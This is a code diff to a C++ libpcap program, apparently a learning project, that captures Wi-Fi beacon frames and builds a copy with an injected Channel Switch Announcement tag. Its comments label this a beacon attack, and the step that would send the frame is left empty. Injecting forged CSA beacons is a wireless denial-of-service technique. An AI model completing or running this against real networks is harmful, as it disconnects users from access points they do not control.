@@ -92,17 +92,26 @@ int main(int argc, char* argv[])
         //printf("beacon frame captured\n");
         int presentCount = isPresentCount(packet);
         uint32_t caplen = header->caplen;
-        if (hasFcs(packet, &rdt, presentCount))
-        {
-            //printf("FCS Found\n");
-            caplen = caplen - 4;
-        }
+        bool Fcs = hasFcs(packet, &rdt, presentCount);
 
         // phase 2: insert channel switch announcement
-        // 패킷을 추가해가면 어떨까?
+        const u_char* beaconTagPacket = (packet + rdt.len + sizeof(ST_WL) + sizeof(ST_BC_COMMON));
+        int tagLen = (header->caplen - rdt.len - sizeof(ST_WL) - sizeof(ST_BC_COMMON));
+        int InsertTagLoc =  header->caplen - tagLen +
+            getInsertTagLoc(beaconTagPacket, tagLen, 37);
+
+        int newPacketLen = header->caplen + 5;
+        u_char* newPacket = new u_char[newPacketLen];
+        memcpy(newPacket, packet, InsertTagLoc);
+        uint8_t csaTag[5] = {0x25, 0x03, 0x01, 0x0B, 0x03};
+        memcpy(newPacket+InsertTagLoc, csaTag, 5);
+        memcpy(newPacket+InsertTagLoc+5, packet+InsertTagLoc, header->caplen-InsertTagLoc);
+        // header->caplen을 패킷에서 찾는건줄 알았으나, 와이어샤크에서 pcap 파일을 수정 후 열때 문제인 것 같아 pass
 
         // phase 3: send beacon attack frame
+        
 
+        delete[] newPacket;
     }
 
     pcap_close(pcap);
